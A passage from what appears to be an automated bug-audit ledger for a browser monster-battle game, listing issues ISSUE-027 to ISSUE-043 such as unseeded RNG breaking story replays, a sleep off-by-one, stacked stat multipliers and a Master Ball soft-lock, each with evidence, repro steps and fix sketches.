**Fix sketch**: `const _r = (sm && sm.active) ? storyRngNext : Math.random; mon.sleepDuration = Math.floor(_r() * 3) + 1;` Apply same pattern to Sleep Talk move pick at line 20077.

**Verification**: Two story replays at the same seed produce identical wake-up timing.

---

## <a id="ISSUE-027"></a> ISSUE-027: League foe stat boost stacks multiplicatively despite comment claiming additive merge

---
id: ISSUE-027
severity: P1
category: bug
anchor_symbol: applyStoryLeagueFoeStatBoost
current_line_hint: ~30729
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7ce8a9ce8254
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: League foe stat boost stacks multiplicatively despite comment claiming additive merge

**Evidence**:
```js
// battle.html ~30729  applyStoryLeagueFoeStatBoost
const newMaxHp = Math.max(1, Math.floor(mon.maxHp * hpM));   // direct multiply
mon.maxHp = newMaxHp;                                         // mutates mon.maxHp directly
// no `mon._leagueStatBonus = { hp, bulk, spe }` write ANYWHERE

// battle.html ~13244  applyFoeDifficultyScaling (called AFTER the boost)
//  > League boost ... is stored as additive deltas on the mon by
//  > applyStoryLeagueFoeStatBoost so difficulty and boss boost stack
//  > ADDITIVELY (not multiplicatively).
const lb = mon._leagueStatBonus;          // always undefined
const hpMult = mult + (lb && lb.hp ? lb.hp : 0);  // hpMult = mult (no add)
const newMaxHp = Math.max(1, Math.floor(mon.maxHp * hpMult));  // hpM already applied above → MULTIPLIES AGAIN
```
`grep -nE "_leagueStatBonus" battle.html` returns exactly one hit (the read site). No writer exists.

**Repro**: Fight Champion on Hard mode. HP multiplier = `1.40` (league) × `1.15` (Hard) × `1.20` (`_stageGatedFoeStatMult` for Champion) = **×1.932**, not the documented "1.30 ×1.40 = 1.82 cliff" the additive shim was supposed to flatten. The "cliff" the comment claims was fixed is in fact still there, plus an extra ×1.20 stage-gate term.

**Blast radius**: Every story-mode E1-E4 / Champion / League Rival / post-HoF Mystery foe fight on Easy/Hard/Challenge. Crucible Hard Mode rematches stack a 4th multiplier (×1.30) on top, pushing Champion-rematch HP to base ×2.09+ on Hard+Hard, plausibly higher than playtested.

**Fix sketch**: Either (a) make the comment match reality (it's intentionally multiplicative — drop the additive narrative), or (b) implement the missing writer in `applyStoryLeagueFoeStatBoost`: store `mon._leagueStatBonus = { hp: hpM-1, bulk: bulkM-1, spe: speM-1 }` *instead of* mutating maxHp, and let `applyFoeDifficultyScaling` apply the merged multiplier. Option (b) is the harder fix but matches the intent encoded in the read site.

**Verification**: After (b): a Champion fight on Hard with league boost 1.40 + difficulty 1.15 should have foe HP ≈ `base * (1 + 0.40 + 0.15) = base * 1.55`, not `base * 1.40 * 1.15 = base * 1.61`. The Hard / Normal gap should be the bare 0.15 delta, not 0.21.

---

## <a id="ISSUE-028"></a> ISSUE-028: Black Market shop from STORY_FEATURES_INTEGRATION.md §3 is still entirely unimplemented

---
id: ISSUE-028
severity: P1
category: inconsistency
anchor_symbol: BLACK_MARKET_ITEMS
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 580596d9a9df
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Black Market shop from STORY_FEATURES_INTEGRATION.md §3 is still entirely unimplemented

**Evidence**:
```
$ grep -nE 'BLACK_MARKET|blackMarket|BlackMarket|black_market' battle.html
(no matches)
```

**Repro**: Open any City5+ hub, look for a Black Market button beside Mart / Department Store. Buttons absent regardless of progression. Spec promises `enterBlackMarket()` modal w/ Rare Candy / Mystery Egg / Forged Pass / Black Market TM / Intel Dossier / Fence / Shady Repel / Legend Chip SKUs, gated by `sm.blackMarketUnlocked && cityIdx >= 5`.

**Blast radius**: Six spec sections (§3, §3.5, §8, §10) hang off this; no `sm.blackMarketUnlocked` flag, no `enterBlackMarket()` route, no DX or QA pass possible. README §44 doesn't currently claim it, but `docs/STORY_FEATURES_INTEGRATION.md` is treated as canonical for the design vision, and the prior May 2026 audit ranked this #3 in priority — still unshipped.

**Fix sketch**: Author `BLACK_MARKET_ITEMS` const next to `POKEMART_ITEMS`/`DEPT_ITEMS` (anchor ~battle.html:28876 for the mart catalog), add `sm.blackMarketUnlocked` migration in a new `migrateStoryPreV20`, and add an `enterBlackMarket()` route + city-action button gated on `(sm.blackMarketUnlocked && getCityIndex() >= 5)`.

**Verification**: After implementation, `grep -nE 'BLACK_MARKET_ITEMS|enterBlackMarket' battle.html` returns ≥3 hits and a visit to City5 after itinerary beat shows the Black Market button.

---

## <a id="ISSUE-029"></a> ISSUE-029: Three conflicting "canon" docs for the boss/endgame arc; code matches none cleanly

---
id: ISSUE-029
severity: P1
category: inconsistency
anchor_symbol: BOSS_CONFIGS
current_line_hint: ~41855
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 07232f72109f
confidence: high
status: open
---

**Title**: Three conflicting "canon" docs for the boss/endgame arc; code matches none cleanly

**Evidence**:
```
docs/STORY_EXPANSION_PLAN.md:7  "This doc supersedes the boss/legendary sections of STORY_MODE_FLOW.md
                                 and docs/STORY_NARRATIVE_VARIANTS.md where they conflict."
docs/STORY_EXPANSION_PLAN.md:88 "'Caged God' boss arc … Removed entirely. Boss content moves into expansions."
docs/STORY_EXPANSION_PLAN.md:20 (decision #1) "Boss aftermath — No catch — boss vanishes on KO."
```

**Repro**: Read STORY_MODE_FLOW.md §9 (Caged God = live, catch-only, 10x HP, post-HoF) vs docs/STORY_EXPANSION_PLAN.md §1.1/§0 (Caged God removed entirely, replaced by transformation-puzzle raids, no catch) vs docs/story-design/STORY_3TRACK_IMPL_PLAN.md PR-5 (faintPhase/hpThresholdPhase/immunityRound BOSS_CONFIGS). Then grep `sm.bossArc` in battle.html — the Caged God is still fully shipped.

**Blast radius**: Every future boss/endgame change has no single source of truth. An agent reading EXPANSION_PLAN would "remove" a live, shipped, reachable feature (`continuePostGame` Master-Ball gift, Subject Zero capture, `_bossArcRenderSection`). An agent reading FLOW §9 would miss that EXPANSION_PLAN claims to supersede it.

**Fix sketch**: Pick one canon. Either (a) mark STORY_EXPANSION_PLAN.md as "PLANNED / not yet built" at the top (its Phase A–H, incl. "Phase C — Caged God removal", are unimplemented), so its supersede-claim doesn't mislead; or (b) if the expansion model is the real direction, add a status banner to FLOW §9 + 3TRACK_IMPL_PLAN PR-5 pointing forward. The supersede sentence at line 7 is factually false relative to shipped code today.

**Verification**: After reconciliation, a reader of the chosen canon doc can predict the shipped boss flow without contradiction from the other two docs.

---

## <a id="ISSUE-030"></a> ISSUE-030: `canMove` paralysis + confusion self-hit checks use bare `Math.random()` (RNG drift in story replays)

---
id: ISSUE-030
severity: P1
category: bug
anchor_symbol: canMove
current_line_hint: ~24232
file: battle.html
agents: [battle-engine-debugger]
fingerprint: ffc310969bdf
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `canMove` paralysis + confusion self-hit checks use bare `Math.random()` (RNG drift in story replays)

**Evidence**:
```js
// battle.html:24232 (PAR full-paralysis)
if (mon.status === "PAR" && Math.random() < 0.25) { logMsg(`${mon.name} is paralyzed!`, 'status'); return false; }
// battle.html:24257 (confusion self-hit)
else if (Math.random() < 0.3333) { /* confusion self-hit */ }
```

The sibling ice-thaw site at 24228 was already fixed (`const _thawRng = (sm && sm.active) ? storyRngNext : Math.random;`). Paralysis and confusion in the *same handler* were not updated.

**Repro**: In a story run with fixed `sm.runSeed`, save right before a PAR/confused mon's turn; reload twice. PAR full-para and confusion self-hit differ across loads because they consume native `Math.random()` instead of the seeded `_strngState` stream.

**Blast radius**: Every `canMove` call (twice per turn). All seeded replays. `story-replay.mjs` determinism is broken every time PAR/Confusion fires.

**Fix sketch**: Mirror the line-24228 pattern: `const _r = (sm && sm.active) ? storyRngNext : Math.random; if (mon.status === "PAR" && _r() < 0.25) ...` Same for line 24257.

**Verification**: Run `npm run debug:replay diff <seed>`; post-fix should be byte-identical across two replay invocations.

---

## <a id="ISSUE-031"></a> ISSUE-031: Sleep wake-check is off-by-one — ~1/3 of sleeps cost 0 turns (instant wake, mon acts same turn)

---
id: ISSUE-031
severity: P1
category: bug
anchor_symbol: canMove
current_line_hint: ~25408
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1a2a30d45840
confidence: high
status: open
---

**Title**: Sleep wake-check is off-by-one — ~1/3 of sleeps cost 0 turns (instant wake, mon acts same turn)

**Evidence**:
```js
// canMove() — battle.html:25406
if (mon.status === "SLP") {
    mon.statusTurns++;                       // pre-increment BEFORE the wake check
    let wakeThreshold = mon.sleepDuration || 2;
    if (mon.ability === "Early Bird") wakeThreshold = Math.ceil(wakeThreshold / 2);
    if (mon.statusTurns >= wakeThreshold) { mon.status = null; ...; return true; }  // wakes AND acts this turn
```
`applyStatus` sets `mon.sleepDuration = Math.floor(Math.random()*3)+1` → {1,2,3}. With the pre-increment + `>=`,
a roll of `sleepDuration===1` makes `statusTurns` 0→1, `1 >= 1` true → the mon wakes and acts on the SAME turn it
would first try to move = **0 turns truly asleep**. Effective lost-actions distribution is {0,1,2}, not Showdown's
{1,2,3}. ISSUE-006 (fixed) addressed only the RNG *determinism* of the roll and explicitly (and incorrectly)
asserted "1–3 spread matches Showdown" — the wake arithmetic, not the roll, is the deviation. Not in
tests/reports/deviations.md.

**Repro**: `node scripts/debug/_repro/sleep-real.mjs` — foe set to `status='SLP', sleepDuration=1` (a ~1/3 roll).
Output: `Gengar woke up! | Gengar used Shadow Ball!` on turn 1 — i.e. `woke===true && foeActed===true`, the sleep
cost zero actions. Showdown forces the sleeper to lose at least one action. Also `scripts/debug/_repro/sleep-duration.mjs`
prints lost-actions per duration: 1→0, 2→1, 3→2.

**Blast radius**: Every sleep-inducing move (Spore, Sleep Powder, Hypnosis, Lovely Kiss, Dark Void, Yawn, Rest-on-foe
via tricks). Spore/Hypnosis leads lose ~33% of their value; a "sleep then set up" line frequently gives the opponent a
free turn. Interacts with ISSUE-061 (Spore scored 100 by AI) — the AI over-values a status that under-delivers. Rest
(self-sleep, 2 turns) wakes after only 1 lost action instead of 2, so the user is vulnerable a turn early.

**Fix sketch**: Make the asleep duration count lost actions directly. Either (a) roll `sleepDuration = floor(rand*3)+1`
and use a strict `>` so `statusTurns > sleepDuration` wakes after exactly `sleepDuration` asleep turns; or (b) keep `>=`
but roll `floor(rand*3)+2` (={2,3,4}) so the minimum is 1 lost action — matching Showdown's `random(2,5)` internal
counter. Apply the same audit to `Early Bird` (currently `ceil(threshold/2)`: with threshold 1 it stays 1 → still
instant wake).

**Verification**: Re-run `sleep-real.mjs` with `sleepDuration` set to the minimum roll; the foe must log `is fast
asleep.` and NOT act on turn 1. Add a `status.test.js` case: put a mon to sleep with the minimum roll, assert it loses
≥1 action before waking.

---

## <a id="ISSUE-032"></a> ISSUE-032: Sleep off-by-one: sleepDuration=1 wakes and attacks on its first turn (0 turns lost); effective sleep is 0-2 turns not 1-3

---
id: ISSUE-032
severity: P1
category: bug
anchor_symbol: canMove
current_line_hint: ~26058
file: battle.html
agents: [battle-engine-debugger]
fingerprint: e264dd705b7b
confidence: high
status: open
---

**Title**: Sleep off-by-one: sleepDuration=1 wakes and attacks on its first turn (0 turns lost); effective sleep is 0-2 turns not 1-3

**Evidence**:
```js
mon.statusTurns++;
let wakeThreshold = mon.sleepDuration || 2;     // sleepDuration rolled 1..3 at 27748
if (mon.ability === "Early Bird") wakeThreshold = Math.ceil(wakeThreshold / 2);
if (mon.statusTurns >= wakeThreshold) { mon.status = null; ...; return true; } // wakes AND moves
```

**Repro**: `node scripts/debug/_repro/status.mjs` — duration=1 ⇒ turn 1 "woke up", attack lands (foeDmg=155), zero turns asleep; duration=2 ⇒ 1 turn lost; duration=3 ⇒ 2 turns lost. Roll is `Math.floor(Math.random()*3)+1` (battle.html:27748) = 1/2/3, so the mon loses duration-1 turns. ~1/3 of sleeps (duration=1) are complete no-ops — the target acts the same turn it was put to sleep.

**Blast radius**: Every sleep move (Spore, Sleep Powder, Hypnosis, Yawn, etc.) in Story battles. Sleep is significantly weaker than Showdown (where a slept mon loses 1-3 turns). Player-favoring when foe sleeps the player; foe-favoring when player sleeps the foe — either way wrong-result vs spec.

**Fix sketch**: Either roll `sleepDuration` as 2-4 (`Math.floor(rng()*3)+2`) to match "loses 1-3 turns" with the increment-then-check pattern, or change the wake check so the mon stays asleep through `statusTurns < sleepDuration` and wakes (without moving) on the turn AFTER reaching duration. Rest (fixed sleepDuration=2 at 26343) should be audited together so it still costs the canonical turns.

**Verification**: `node scripts/debug/_repro/status.mjs` — duration=1 must show turn 1 "fast asleep" (no attack), turn 2 "woke up".

---

## <a id="ISSUE-033"></a> ISSUE-033: `canMove` paralysis fizzle uses bare `Math.random()` while sibling freeze thaw uses `storyRngNext`

---
id: ISSUE-033
severity: P1
category: bug
anchor_symbol: canMove
current_line_hint: ~24232
file: battle.html
agents: [consistency-auditor]
fingerprint: 39f6ad985c2c
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `canMove` paralysis fizzle uses bare `Math.random()` while sibling freeze thaw uses `storyRngNext`

**Evidence**:
```js
// L24227-24230  (FRZ thaw — already deterministic)
if (mon.status === "FRZ") {
    const _thawRng = (sm && sm.active) ? storyRngNext : Math.random;
    if (_thawRng() < 0.2) { mon.status = null; logMsg(`${mon.name} thawed out!`, 'info'); return true; }
    logMsg(`${mon.name} is frozen solid!`, 'status'); return false;
}
// L24232 (PAR fizzle — STILL BARE)
if (mon.status === "PAR" && Math.random() < 0.25) { logMsg(`${mon.name} is paralyzed! It can't move!`, 'status'); return false; }
// L24257 (confusion self-hit — STILL BARE)
else if (Math.random() < 0.3333) {
    // Confusion self-hit ...
```

**Repro**: Story battle, seed it, paralyze the player's mon. Replay with same seed — paralysis "can't move" / "moves through it" outcomes will not match across replays.

**Blast radius**: Same class as the parseMoveEffects cluster, but in the very-hot path that runs every turn. Drift is more visible because PAR fizzles change whether a move lands at all (cascades into damage rolls, KOs, and switch order).

**Fix sketch**: Add the same `_rng = (sm && sm.active) ? storyRngNext : Math.random` shim at the top of `canMove` and replace L24232 PAR fizzle and L24257 confusion self-hit. The freeze branch already does this; copy the same idiom.

**Verification**: Seeded-replay test where the player's lead is PAR'd on turn 1 — assert PAR fizzle outcomes match across two seeded runs. Same for confusion self-hit.

---

## <a id="ISSUE-034"></a> ISSUE-034: Casino Coin Flip outcome uses Math.random(), not seeded storyRngNext()

---
id: ISSUE-034
severity: P1
category: bug
anchor_symbol: casinoFlipSpin
current_line_hint: ~50830
file: battle.html
agents: [story-mode-investigator]
fingerprint: af2dc4e3be42
confidence: high
status: open
---

**Title**: Casino Coin Flip outcome uses Math.random(), not seeded storyRngNext()

**Evidence**:
```js
const win  = Math.random() < CASINO_FLIP_WIN_P;   // casinoFlipSpin (~50830)
```

**Repro**: Casino → Flip tab → press Flip. Win/loss is `Math.random()`.

**Blast radius**: CLAUDE.md rule: "Use seeded RNG (storyRngNext) everywhere user-visible, never bare Math.random(). Deterministic replays are part of the product." Casino is user-visible, gold- and prize-affecting. story-replay.mjs diverges at any casino visit. All 3 games + prize roller share this.

**Fix sketch**: Replace Math.random() with storyRngNext() in the flip win check.

**Verification**: Same-seed replay → identical flip outcomes; grep casino block 50813-51470 for Math.random → 0.

---

## <a id="ISSUE-035"></a> ISSUE-035: Casino Roulette winning cell chosen with Math.random(), not seeded RNG

---
id: ISSUE-035
severity: P1
category: bug
anchor_symbol: casinoRoulSpin
current_line_hint: ~51392
file: battle.html
agents: [story-mode-investigator]
fingerprint: 2fd9ec729600
confidence: high
status: open
---

**Title**: Casino Roulette winning cell chosen with Math.random(), not seeded RNG

**Evidence**:
```js
const winIdx = (Math.random() * cells.length) | 0;   // casinoRoulSpin (~51392)
```

**Repro**: Casino → Roulette → stake → Spin.

**Blast radius**: Same seeded-RNG rule; 11x payouts feed gold + prize roller.

**Fix sketch**: const winIdx = (storyRngNext() * cells.length) | 0;

**Verification**: Seeded replay parity.

---

## <a id="ISSUE-036"></a> ISSUE-036: Ball inventory + `catchMode` flag in STORY_FEATURES_INTEGRATION §1/§2/§5 do not match shipped code

---
id: ISSUE-036
severity: P1
category: inconsistency
anchor_symbol: catchMode
current_line_hint: ~44680
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 4592b2ea36ea
confidence: high
status: open
---

**Title**: Ball inventory + `catchMode` flag in STORY_FEATURES_INTEGRATION §1/§2/§5 do not match shipped code

**Evidence**:
```js
// SPEC (docs/STORY_FEATURES_INTEGRATION.md §1):
//   Inventory: sm.inventory.pokeball / greatBall / ultraBall / masterBall
//   Sold at Poke Mart only when `catchMode` is on
// CODE (battle.html ~44680, ball render loop):
ballRows = ['poke','great','ultra','master'].map(k => {
    const have = (sm.balls && (sm.balls[k] | 0)) || 0;   // sm.balls.poke, NOT sm.inventory.pokeball
    ...onclick="window.StoryMode.catchThrow('${k}')"
// grep 'catchMode' battle.html -> 0 hits; catching is gated by STORY_BATTLE_INTERRUPTS + _shouldFireWildBeforeBattle, not a setting.
```

**Repro**: `grep -nE "sm\.inventory\.(pokeball|greatBall)|catchMode" battle.html` → 0 hits. Catch UI is live (`#screen-story-catch`, `catchThrow`), balls live at `sm.balls.{poke,great,ultra,master}`. STORY_MODE_AUDIT already noted "catchMode undefined / mart forgets balls"; this finding pins the *exact field-path drift* still present in the canonical integration spec.

**Blast radius**: Anyone implementing the spec'd Mart ball-rows (§1), the PC auto-deposit gate (§2 keys on `catchMode || sm.pcBox.length>0`), or the `eventsOn off / catch still works if catchMode on` rule (§8) will code against fields that don't exist. The shipped design uses a different model (interrupt-driven wilds, `sm.balls`), so the integration spec mis-describes its own foundation.

**Fix sketch**: Update STORY_FEATURES_INTEGRATION §1/§2/§5/§8 to reference `sm.balls.{poke,great,ultra,master}` and the actual gate (`STORY_BATTLE_INTERRUPTS` / wild-route interrupt + `classicMode` for gimmick-restriction), or rename a real toggle to `catchMode` if one is intended. Read-only audit — do not edit the spec here; file is the doc-owner's call.

**Verification**: After reconciliation, `grep -nE "sm\.balls|STORY_BATTLE_INTERRUPTS" battle.html` matches the field names quoted in §1/§2; `catchMode` either exists in code or is struck from the spec.

---

## <a id="ISSUE-037"></a> ISSUE-037: The unique Master Ball can be wasted on any wild — soft-locks the Caged God capture (only 1% catch rate without it)

---
id: ISSUE-037
severity: P1
category: bug
anchor_symbol: catchThrow
current_line_hint: ~45155
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7856b112bcd7
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: The unique Master Ball can be wasted on any wild — soft-locks the Caged God capture (only 1% catch rate without it)

**Evidence**:
```js
} else {
    if (_catchState.safariMode) return;
    if (!sm.balls || (sm.balls[ballKey] | 0) <= 0) return;
    sm.balls[ballKey] = (sm.balls[ballKey] | 0) - 1;   // master ball decremented like any ball
}
```

**Repro**: The Master Ball is granted exactly once, at post-HoF boss-arc unlock (`sm.balls.master += 1`, ~line 48863) and is deliberately never re-granted (comment at ~41676: "keeping the Master Ball uniquely tied to the Caged God arc"; the 100-dex milestone substitutes a trophy bundle). But every regular catch encounter renders Master Ball as a throwable option (`['poke','great','ultra','master']`, ~line 45008) and `catchThrow` decrements it with no guard. After HoF the player can encounter wilds via the Crucible (`crucibleWildEncounter`) or a re-queued roaming legendary and burn the Master Ball there. The Caged God uses `forcedCatchRate: 0.01` (`bossEnterCage`, ~44160) — with the Master Ball gone, the boss is ~1% per non-Master throw, no guaranteed catch remains.

**Blast radius**: Caged God post-game arc (capture is the whole payoff — Subject Zero + a 10,000G/full-vitamin reward bundle). A player who wastes the ball before collecting the 3 city leads has no recovery path short of grinding 1% throws.

**Fix sketch**: Either (a) hide / disable the Master Ball button outside boss mode (it has no legitimate non-boss use given it's unique), or (b) keep it throwable but re-grant a replacement on cage-unlock if `sm.balls.master === 0`, or (c) make the boss catch fall back to guaranteed on first ball if no Master Ball is held. Option (a) matches the narrative ("saved for that one fight", ~line 10610).

**Verification**: Post-HoF, throw the Master Ball at a Crucible wild, then collect 3 leads and enter the cage — confirm the player can still catch Subject Zero (button present or auto-guaranteed).

---

## <a id="ISSUE-038"></a> ISSUE-038: Unique Master Ball can be wasted on any non-boss wild (Crucible wild encounter), soft-locking the Caged God capture — VERIFIED still present post-merge

---
id: ISSUE-038
severity: P1
category: bug
anchor_symbol: catchThrow
current_line_hint: ~45205
file: battle.html
agents: [story-mode-investigator]
fingerprint: fde69214ddbf
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Unique Master Ball can be wasted on any non-boss wild (Crucible wild encounter), soft-locking the Caged God capture — VERIFIED still present post-merge

**Evidence**: Ledger ISSUE-013, re-verified against current code. After the post-HoF Mystery Figure climax, the player is handed the one and only Master Ball immediately (~48954: `sm.balls.master = (sm.balls.master|0) + 1`) and told to go collect the 3 cage leads. While holding it, the post-game `crucibleWildEncounter()` (~43781) opens a normal catch screen, and `catchThrow('master')` (~45205) has NO boss/uniqueness guard:
```js
if (!sm.balls || (sm.balls[ballKey] | 0) <= 0) return;
sm.balls[ballKey] = (sm.balls[ballKey] | 0) - 1;   // master decremented like any ball
...
const chance = mult === Infinity ? 1 : ...;          // master = guaranteed catch on ANY wild
```
The Caged God catch uses `forcedCatchRate: 0.01` (~44225) — designed around the Master Ball's guaranteed catch. With the Master Ball spent on a Crucible wild, the player faces a ~1% catch rate on the unique boss → effective soft-lock of the run's apex reward.

**Repro**: Post-HoF → receive Master Ball → open Crucible → "Wild Encounter" → throw Master Ball at the wild (succeeds, consumes it) → collect leads → "Enter the Cage" → 1% catch rate, no Master Ball.

**Blast radius**: Post-game Caged God arc — the headline post-HoF reward (Subject Zero / 10,000G + full vitamin bundle).

**Fix sketch**: Hide/disable the Master Ball in the catch UI unless `_catchState.bossMode`, or block `catchThrow('master')` when `!_catchState.bossMode`. Alternatively re-grant the Master Ball at cage-unlock so it cannot be permanently lost.

**Verification**: Throw the Master Ball at a Crucible wild; the throw should be rejected (ball not offered) outside boss mode, and `sm.balls.master` should still be 1 at cage entry.

---

## <a id="ISSUE-039"></a> ISSUE-039: Toxic (badly-poison) counter `statusTurns` is not reset on switch-out

---
id: ISSUE-039
severity: P1
category: bug
anchor_symbol: clearVolatileOnSwitch
current_line_hint: ~25703
file: battle.html
agents: [battle-engine-debugger]
fingerprint: a91c04d51751
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Toxic (badly-poison) counter `statusTurns` is not reset on switch-out

**Evidence**:
```js
function clearVolatileOnSwitch(mon) {
    if (mon.ability === "Natural Cure" && mon.status) { ... mon.statusTurns = 0; }
    mon.stages = {atk:0, ...};
    mon.volatile.confusion = 0;
    // ...clears every volatile, BUT never resets mon.statusTurns for a surviving TOX mon...
}   // statusTurns survives the switch -> toxic damage keeps escalating
```

**Repro**: `node scripts/debug/_repro/tox-reset.mjs` — TOX a Snorlax, tick 4 EoTs (counter→4, ~1/16…4/16), call `clearVolatileOnSwitch`, restore to full HP, tick one more EoT. Observed: `statusTurns` stays 4 across the switch and the first tick back in deals 5/16 (73 of 235 HP). Canonical Gen 2+: switching out resets the badly-poison counter, so the first tick after re-entry is 1/16.

**Blast radius**: Every TOX interaction with switching (story + PvP). A Toxic-stalling player/AI that pivots keeps the escalated counter, so a returning mon takes far more residual damage than canon — silently warps long-game stall math and any seeded replay comparison. Also affects Poison Heal/Toxic-counter readouts (`statusTurns` is shared).

**Fix sketch**: In `clearVolatileOnSwitch`, when the outgoing mon's status is "TOX", reset its escalation counter (`mon.statusTurns = 0`) so it restarts at 1/16 on re-entry. Leave SLP/other counters governed by their own handlers.

**Verification**: Re-run `tox-reset.mjs`; first EoT tick after `clearVolatileOnSwitch` must be 1/16 of maxHp. Add a status suite assertion: TOX → switch → switch back → first tick == floor(maxHp/16).

---

## <a id="ISSUE-040"></a> ISSUE-040: Crucible League Run skips E1 and ends on the Rival — `_CRUCIBLE_LEAGUE_ROWS` are off-by-one row-ids

---
id: ISSUE-040
severity: P1
category: bug
anchor_symbol: crucibleLeagueRun
current_line_hint: ~47921
file: battle.html
agents: [story-mode-investigator]
fingerprint: 347bfcbf535d
confidence: high
status: open
---

**Title**: Crucible League Run skips E1 and ends on the Rival — `_CRUCIBLE_LEAGUE_ROWS` are off-by-one row-ids

**Evidence**:
```js
const _CRUCIBLE_LEAGUE_ROWS = [60, 61, 62, 63, 64];   // "E1..E4 + Champion"
```
Resolved as array indices: idx60=E2, idx61=E3, idx62=E4, idx63=Champion, idx64=**League Rival**. So the run is E2→E3→E4→Champion→Rival — E1 is never fought and the run ends on an unintended Rival fight (which also sets `crucibleBattleSource='league'`, so `_handleCrucibleBattleEnd` reports "League Run cleared" after a rival fight).

**Repro**: Crucible → "League Run (E1 → Champion)". First foe is Elite 2, not Elite 1; final foe is the Rival.

**Blast radius**: Crucible League Run only (post-game).

**Fix sketch**: Use `[59,60,61,62,63]` (array indices for E1..Champion) or findIndex by row-id 60..64.

**Verification**: Run the League Run; confirm sequence E1→E2→E3→E4→Champion.

---

## <a id="ISSUE-041"></a> ISSUE-041: proceedToNextBattle re-entry stacks duplicate cold-open overlays, wedging progression (the "After Badge One" stuck state)

---
id: ISSUE-041
severity: P1
category: bug
anchor_symbol: enterBattleEvent
current_line_hint: ~42373
file: battle.html
agents: [story-mode-investigator]
fingerprint: be6f0b9ce8fd
confidence: high
status: fixed-main
---

**Title**: proceedToNextBattle re-entry stacks duplicate cold-open overlays, wedging progression (the "After Badge One" stuck state)

**Evidence**:
`enterBattleEvent` fires a cold-open via `_runStoryColdOpen(beat, ev, onDone)`. The scene's per-run dedupe (`sm.scenesShown[metaKey]`) is only marked when the player clicks **Continue** (in `_renderNarrativeOverlay`'s `dismiss` / `_runStoryColdOpen`'s onPlayed). There is NO re-entry guard: calling `proceedToNextBattle()` again while the overlay is up re-enters `enterBattleEvent` → re-fires the same cold-open → appends ANOTHER full-screen `z-index:9998` overlay. Reproduced in jsdom:
```
after 1st proceed: overlays 1 | scenesShown[cold-classic-gym1]: false
after 2nd proceed: overlays 2 | scenesShown[cold-classic-gym1]: false
after 3rd proceed: overlays 3 | text: "Continue →","Continue →","Continue →"
```
Clicking Continue dismisses only the topmost; the rest remain stacked.

**Repro**: `node scripts/debug/_repro/coldopen-reentry.mjs`. Real-browser confirmation: `agent-state/playtest/player/021-final.png` shows the run terminally stuck on the "After Badge One" (`classic_gym1`, row 7) cold-open after badge 1, matching the user's report. The autopilot's `classify` reads `cityScreen: scr('screen-story-city')` = true (the city is visible *under* the overlay), so its pump calls `proceedToNextBattle()` every tick → 270 ticks of stacking.

**Blast radius**: Every cold-open beat (rows 7/20/26/33/48/53/56/64 per variant), the intro-rival cold-open, the catch screen, and `showBattleIntro` share the no-guard pattern. Any double-tap of a route/gym button, or any code path that calls `proceedToNextBattle`/`enterBattleEvent` while a blocking overlay is live, stacks overlays.

**Fix sketch**: Add a module-level re-entry latch (e.g. `_storyNavBusy`) set at the top of `proceedToNextBattle`/`enterBattleEvent` and cleared when the battle launches or the player returns to a hub; bail early if already busy. Alternatively, `_runStoryColdOpen` could no-op when an overlay with the same metaKey is already in the DOM.

**Verification**: Re-run `coldopen-reentry.mjs`; overlay count must stay at 1 across repeated `proceedToNextBattle()` calls.

---

## <a id="ISSUE-042"></a> ISSUE-042: Post-HoF Crucible hub button gated on dead `bossArc.available` — never renders

---
id: ISSUE-042
severity: P1
category: bug
anchor_symbol: enterCity
current_line_hint: ~43816
file: battle.html
agents: [consistency-auditor]
fingerprint: db1dd616e801
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Post-HoF Crucible hub button gated on dead `bossArc.available` — never renders

**Evidence**:
```js
// enterCity() — the ONLY city-action that surfaces the Crucible:
if (sm.bossArc && sm.bossArc.available) {
    _push('recover', makeActionBtn('🧨 The Crucible','crucible',
          'window.StoryMode.enterCrucible()','center', ...));
}
// But sm.bossArc.available is NEVER set true anywhere in battle.html
// (grep: only reads + one '= false' at ~43078 in a dev seeder).
// migrateStoryPreV24 deletes sm.bossArc entirely; _bossArcEnsureState
// re-creates it with { available:false }.
```

**Repro**: Finish Hall of Fame → `continuePostGame()` runs the row-67 Mystery climax, then drops to `enterCity()`. The orientation tip (~54687) promises "🧨 The Crucible — reaches from any city you've visited," but the button's gate (`bossArc.available`) is permanently false, so it never appears. The post-game super-hub is unreachable from the city action strip.

**Blast radius**: Entire post-game. Crucible = Battle Frontier ladder, League/rival/gym rematches, Mystery Figure rematch, all tutors/shops. All become unreachable from cities. (Internal back-buttons at ~9122/9128 only help once you're already inside.)

**Fix sketch**: Re-gate the Crucible button on the real post-game predicate (e.g. `sm.postHofMysteryClimaxDone` or a HoF-cleared flag), not the removed Caged-God `bossArc.available`. This is the canonical old-vs-new merge wound: the Crucible gate was wired to the Caged-God unlock flag, then the Caged-God arc was cut without re-homing the gate.

**Verification**: Boot a post-HoF save; confirm 🧨 The Crucible renders in every visited city's action strip.

---

## <a id="ISSUE-043"></a> ISSUE-043: Retune risk: `data/builds/gen*.json` is a fallback mirror, not the live build source (`data/builds.csv` is authoritative)

---
id: ISSUE-043
severity: P1
category: data
anchor_symbol: fetchSmogonSetsForGen
current_line_hint: ~11590
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 41bbacf8009e
confidence: high
status: open
---

**Title**: Retune risk: `data/builds/gen*.json` is a fallback mirror, not the live build source (`data/builds.csv` is authoritative)

**Evidence**:
```js
// loadBuildsCSV() fetches data/builds.csv FIRST and populates csvBuilds.
// gen*.json is only read by the API fallback (file:// / fetch-fail path):
async function populateCsvBuildsFromAPI() { ...
  await Promise.all([4,5,6,7,8,9].map(g => fetchSmogonSetsForGen(g))); // 9954
// fetchSmogonSetsForGen(gen): fetch(`data/builds/gen${gen}.json`) // 11590
// The ONLY other reader is _loadTeraStats() (49851) — gen9.json teratypes only.
```

